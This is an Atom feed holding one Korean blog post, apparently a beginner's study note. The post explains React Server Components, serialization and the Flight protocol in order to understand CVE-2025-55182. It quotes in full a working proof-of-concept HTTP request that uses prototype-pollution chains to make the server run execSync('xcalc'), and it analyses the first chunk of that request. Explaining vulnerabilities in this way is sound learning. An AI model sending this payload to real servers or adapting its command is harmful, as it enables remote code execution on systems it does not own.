<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko">
    <title>JJJade Log</title>
    <link rel="self" type="application/atom+xml" href="https://jjj-ade.github.io/atom.xml"/>
    <link rel="alternate" type="text/html" href="https://jjj-ade.github.io/"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2025-12-11T00:00:00+00:00</updated>
    <id>https://jjj-ade.github.io/atom.xml</id>
    <entry xml:lang="ko">
        <title>12월 2번째 주</title>
        <published>2025-12-11T00:00:00+00:00</published>
        <updated>2025-12-11T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://jjj-ade.github.io/study/wil/2025/2025-12-2/"/>
        <id>https://jjj-ade.github.io/study/wil/2025/2025-12-2/</id>
        
        <content type="html" xml:base="https://jjj-ade.github.io/study/wil/2025/2025-12-2/">&lt;div role=&quot;alert&quot; class=&quot;alert alert-info alert-soft&quot;&gt;
  &lt;span&gt;초보 수준의 이해기를 담은 글입니다.&lt;&#x2F;span&gt;
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;deuleogagi-apseo&quot;&gt;들어가기 앞서&lt;&#x2F;h2&gt;
&lt;p&gt;평소와 같이 출근을 하던 김포테이토는 잔뜩 생긴 신규 정책을 둘러보느라 정신이 없습니다. CVSS 10 점을 받고 제 2의 Log4j라느니 뭐니 떠들썩 합니다. 그렇게 중요한 것이라면 공부 해야지! 강한 의욕을 가지고 공식 문서와 기술 블로그를 읽어봅니다. 봐도봐도 무슨 말인지 잘 모르겠습니다. 취약점 공부는 중요하기 때문에 인상을 팍 찌푸리고 억지로 한글자씩 읽어 나갑니다.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;#39;RSC 기능을 통해.. RSC? 이게 뭐야.. 역질렬화를.. 청크가.. 뭔데?.. 아니 애초에 이게 뭔 기능을 하던건데.. 
&lt;&#x2F;span&gt;&lt;span&gt;세상 사람들은 React를 다 쓰고 사나봐.. 나만 모르는 거 같은데..&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;자기들끼리 아는 얘기를 신나게 하고 있습니다. 전혀 이해하지 못하고 이게 뭔지도 모르는 김포테이토는 어색하게 웃으며 주변 동료들에게 끄덕입니다. 그래그래, 정말 위험하다. 와 이런 취약점이! 김포테이토는 뭔지도 모르겠는 NIST 문서를 끄고 이메일을 확인하기로 합니다.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;gicobuteo&quot;&gt;기초부터&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;react&quot;&gt;React&lt;&#x2F;h3&gt;
&lt;p&gt;React를 처음 검색하면 UI를 만드는데 도움을 주는 JavaScript 라이브러리 라고 합니다. 사실상 이 취약점을 공부하기 위해서 React를 어떻게 쓰는지, Nest.js랑 무슨 차이점이 있고 등등 마치 리액트 학개론 쪽지시험에 나올법한 자세한 내용은 알지 않아도 됩니다. 왜냐하면 보안인인 김포테이토에게는 시간이 한정되어 있기 때문입니다.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;사용자 인터페이스를 만들기 위한 JavaScript 라이브러리이다.&lt;&#x2F;li&gt;
&lt;li&gt;컴포넌트 기반이다 (UI를 재사용 및 코드 중복을 줄이고 보수를 용이하게 하기위해)&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;이정도만 끄덕끄덕 이해하고 넘어갑니다.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;next-js&quot;&gt;Next.js&lt;&#x2F;h3&gt;
&lt;p&gt;Server Side Rendering, 정적 웹 페이지 생성 등 리액트 기반 오픈 소스 웹 개발 프레임워크 입니다. 설명을 읽던 김포테이토는 눈을 깍 감습니다.(김포테이토: 뭔소리여..!!ㅠㅠ) 서버 렌더링과 정적 웹 사이트 생성 부분을 연속해서 읽습니다. 용어가 와닿지 않으니 계속해서 같은 구문을 빙빙 돕니다. (그냥 서버에서 페이지를 만들어서 보내준다고 생각하면 됩니다.)&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;리액트 기반으로 웹 페이지 뚝딱 따라란~ 을 도와주는 도구다&lt;&#x2F;li&gt;
&lt;li&gt;Client Side 가 아닌 Server Side 에서 랜더링을 해주는 녀석이다.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;rsc-react-server-components&quot;&gt;RSC(React Server Components)&lt;&#x2F;h3&gt;
&lt;p&gt;다행히 김포테이토군은 앞선 지식으로 React가 Server 쪽에서 렌더링을 해준다는 것을 배웠습니다. 이름을 보자마자 직관적으로 이해가 가기 시작합니다.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;아! React가 Server Side Rendering을 하기 위해 처리하고자 하는 Components 구나!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;직독직해의 냄새가 나지만 이정도면 괜찮습니다. 아무튼, React 에서 웹 구현을 위해 Server와 Client 간 와리가리 하는 &#x27;무언가&#x27; 입니다. 비슷한 것으로 JSON이 있었습니다. JSON 데이터와 다르게 RSC는 여러 가지 처리가 가능합니다. {key:value} 와 같이 단순한 형태가 아닌, {&quot;결제자&quot;:&quot;박대리&quot;, &quot;김포테이토&quot;:&quot;고민중&quot;, &quot;박차장&quot;:&quot;김포테이토와 같은 것&quot;, &quot;리뷰이벤트&quot;:&quot;3번 군만두&quot;} 수준으로 처리가 가능해집니다. 쪼개서 전송을 하면서 응답값 처리가 각자 시간이 다르기 때문에 &#x27;뒤에 오는 응답값을 보고서 이거를 해&#x27; 라는 사기적인 요청도 가능해집니다. (여기서 Promise, Then 개념이 등장합니다.) 앞서 나온 &lt;code&gt;청크&lt;&#x2F;code&gt; 라는 아~주 어려워 보이는 개념은 간단합니다. 이 조각 조각 땃따따 쪼개놓은 것을 청크라고 합니다. React는 RSC를 Flight Protocol을 통해 전달합니다. 그냥 보낼 때 사용하는 독자적인 프로토콜로 자세히 알면 다칩니다.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;jigryeolhwa-yeogjigryeolhwa&quot;&gt;직렬화, 역직렬화&lt;&#x2F;h3&gt;
&lt;p&gt;직렬화는 프로그램 내부에서 사용하는 객체, 데이터를 다른 프로그램에 전달해 사용할 수 있도록 바이트 형태로 변환하는 것이고 역직렬화는 당연히 그 반대의 의미를 말합니다.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;모든 프로그램이 (당연하게도) 같은 포맷을 쓰지 않기 때문에 표준 포맷 필요&lt;&#x2F;li&gt;
&lt;li&gt;네트워크로 보내려면 바이트 형태여야함&lt;&#x2F;li&gt;
&lt;li&gt;프로그램에서는 객체가 컴퓨터 내부 포인터 형태라서 그대로 전송 못 함.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;중국 지사 왕과장에게 김포테이토가 한국어로 전달할 수 없듯이, 버스에 타고서 앞에서 2번째 좌석으로 짜장면을 배달 시키고 버스에서 내려버리면 짜장면을 받을 수 없듯이, 여러 문제를 해결하기 위해 직렬화는 중요합니다. JavaScript 에서는 &lt;code&gt;const obj = { name : &quot;potato&quot;, age : &quot;90&quot; };&lt;&#x2F;code&gt; 의 JavaScript 객체를 &lt;code&gt;{&quot;name&quot;:&quot;potato&quot;, &quot;age&quot;:90}&lt;&#x2F;code&gt; 형태로 네트워크에 태워 보내는 것입니다.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flight-protocol&quot;&gt;Flight Protocol&lt;&#x2F;h3&gt;
&lt;h2 id=&quot;peirodeu-humcyeobogi&quot;&gt;페이로드 훔쳐보기&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;POST &#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: localhost
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;142.0.0.0 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Next-Action: x
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: multipart&#x2F;form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 459
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;------WebKitFormBoundaryx8jO2oVc6SWP3Sad
&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;0&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;{&amp;quot;then&amp;quot;:&amp;quot;$1:__proto__:then&amp;quot;,&amp;quot;status&amp;quot;:&amp;quot;resolved_model&amp;quot;,&amp;quot;reason&amp;quot;:-1,&amp;quot;value&amp;quot;:&amp;quot;{\&amp;quot;then\&amp;quot;:\&amp;quot;$B1337\&amp;quot;}&amp;quot;,&amp;quot;_response&amp;quot;:{&amp;quot;_prefix&amp;quot;:&amp;quot;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;xcalc&amp;#39;);&amp;quot;,&amp;quot;_formData&amp;quot;:{&amp;quot;get&amp;quot;:&amp;quot;$1:constructor:constructor&amp;quot;}}}
&lt;&#x2F;span&gt;&lt;span&gt;------WebKitFormBoundaryx8jO2oVc6SWP3Sad
&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;1&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$@0&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;예의상 이분의 gist git 을 그대로 긁어오고 싶었으나, 저주받은 CSS 설정 상 gist  는 자동 줄바꿈이 되지 않기 때문에 부득이하게 코드 형태로 긁어왔습니다. 출처는 &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;maple3142&#x2F;48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http&quot;&gt;&lt;strong&gt;이곳&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt; 입니다. 자 이제 김포테이토는 다시 한 번 페이로드를 읽어봅니다. 처음 &lt;code&gt;Next-Action&lt;&#x2F;code&gt; 과 &lt;code&gt;multipart&lt;&#x2F;code&gt; 가 보입니다. &lt;code&gt;Next-Action&lt;&#x2F;code&gt; 은 React&#x2F;Next.js 실행 시 RSC의 서버 함수 호출을 부르기 위한 커스텀 헤더입니다. 이 부분이 꼭 존재해야만 RSC 처리로 전달됩니다. &lt;code&gt;multipart&lt;&#x2F;code&gt; 는 조각 조각 따따따 (여러개의 청크로 이루어 졌다는 뜻) 하여 전송한다는 뜻으로 사용되었습니다. 바디 값부터 엄청나게 중요한 부분이 나옵니다.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Content-Disposition: form-data; name=&quot;0&quot;&lt;&#x2F;code&gt; 에서 name=&quot;0&quot; 이라는 특이한 부분이 눈에 띕니다. 해당 부분은 청크 ID로 0번째 조각 이라는 뜻입니다. 첫 번째 조각을 정리하면 다음과 같습니다.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;{&amp;quot;then&amp;quot;:&amp;quot;$1:__proto__:then&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;status&amp;quot;:&amp;quot;resolved_model&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;reason&amp;quot;:-1,
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;value&amp;quot;:&amp;quot;{\&amp;quot;then\&amp;quot;:\&amp;quot;$B1337\&amp;quot;}&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;_response&amp;quot;:{&amp;quot;_prefix&amp;quot;:&amp;quot;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;xcalc&amp;#39;);&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;_formData&amp;quot;:{&amp;quot;get&amp;quot;:&amp;quot;$1:constructor:constructor&amp;quot;}}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;then 이 보입니다. 이것은 앞서 회사 점심메뉴 주문에서 스쳐가듯 나온 부분입니다. 여기서 thenable 이라는 아주 중요한 개념이 등장합니다. (김포테이토: 그만나와!!) 하지만 보안인의 시간은 늘 없기 때문에 간단하게 설명 하자면, &lt;code&gt;then() 이 되는 것&lt;&#x2F;code&gt; 입니다.(한때 유행했던 0블리랑 비슷한 느낌이 듭니다.) Flight 프로토콜은 thenable 객체를 특별하게 처리하기 때문에 사실상 &lt;code&gt;&quot;_response&quot;&lt;&#x2F;code&gt; 구문 전까지 최대한 then 이 있는 것처럼 잔뜩 깃털을 부풀린 모습입니다.&lt;&#x2F;p&gt;
&lt;div role=&quot;alert&quot; class=&quot;alert alert-info alert-outline&quot;&gt;
  &lt;span&gt;글이 점점 길어져 부득이하게 1과 2로 나누겠습니다. (계속해서 새로운 정보가 업데이트 되더라구요;)&lt;&#x2F;span&gt;
&lt;&#x2F;div&gt;
</content>
        
    </entry>
</feed>
